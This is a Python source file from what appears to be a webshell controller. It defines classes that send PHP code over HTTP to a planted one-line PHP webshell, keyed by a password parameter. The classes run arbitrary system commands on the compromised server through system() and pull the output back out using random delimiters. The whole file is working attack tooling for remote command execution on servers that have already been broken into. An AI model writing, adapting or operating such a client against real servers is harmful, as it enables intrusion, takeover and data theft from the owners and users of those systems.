import typing as t
import logging
import random
import string
import httpx
from .base import Session

logger = logging.getLogger("sessions.php")
SUBMIT_WRAPPER_PHP = """\
echo '{delimiter_start_1}'.'{delimiter_start_2}';\
try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}\
echo '{delimiter_stop}';"""


__all__ = ["PHPWebshellMixin", "PHPWebshellOneliner"]


class PHPWebshellMixin:
    async def execute_cmd(self, cmd: str) -> str:
        return await self.submit(f"system({cmd!r});")

    async def test_usablility(self) -> bool:
        first_string, second_string = (
            "".join(random.choices(string.ascii_lowercase, k=6)),
            "".join(random.choices(string.ascii_lowercase, k=6)),
        )
        result = await self.submit(f"echo '{first_string}' . '{second_string}';")
        return (first_string + second_string) in result

    async def submit(self, payload: str) -> str:
        start, stop = (
            "".join(random.choices(string.ascii_lowercase, k=6)),
            "".join(random.choices(string.ascii_lowercase, k=6)),
        )
        payload = SUBMIT_WRAPPER_PHP.format(
            delimiter_start_1=start[:3],
            delimiter_start_2=start[3:],
            delimiter_stop=stop,
            payload_raw=payload,
        )
        result = await self.submit_raw(payload)
        if result is None:
            return None
        status_code, text = result
        if status_code != 200:
            logger.warning("status code error: %d", status_code)
            return None
        if "POSTEXEC_FAILED" in text:
            logger.warning("POSTEXEC_FAILED found, payload run failed")
            return None
        idx_start = text.find(start)
        if idx_start == -1:
            logger.warning("idx error: start=%d, text=%s", idx_start, repr(text))
            return None
        idx_stop_r = text[idx_start:].find(stop)
        if idx_stop_r == -1:
            logger.warning(
                "idx error: start=%d, stop_r=%d, text=%s",
                idx_start,
                idx_stop_r,
                repr(text),
            )
            return None
        idx_stop = idx_stop_r + idx_start
        return text[idx_start + len(start) : idx_stop]

    async def submit_raw(self, payload: str) -> t.Union[t.Tuple[int, str], None]:
        """提交原始php payload

        Args:
            payload (str): 需要提交的payload

        Returns:
            t.Union[t.Tuple[int, str], None]: 返回的结果，要么为状态码和响应正文，要么为None
        """
        raise NotImplementedError("这个函数应该由实际的实现override")


class PHPWebshellOneliner(PHPWebshellMixin, Session):
    """一句话的php webshell"""

    def __init__(
        self,
        method: str,
        url: str,
        password: str,
        params: t.Union[t.Dict, None] = None,
        data: t.Union[t.Dict, None] = None,
    ) -> None:
        super().__init__()
        self.method = method.upper()
        self.url = url
        self.password = password
        self.params = {} if params is None else params
        self.data = {} if data is None else data

    async def submit_raw(self, payload: str):
        params = self.params.copy()
        data = self.data.copy()
        if self.method in ["GET", "HEAD"]:
            params[self.password] = payload
        else:
            data[self.password] = payload
        try:
            async with httpx.AsyncClient() as client:
                response = await client.request(
                    method=self.method, url=self.url, params=params, data=data
                )
                return response.status_code, response.text
        except httpx.HTTPError:
            return None
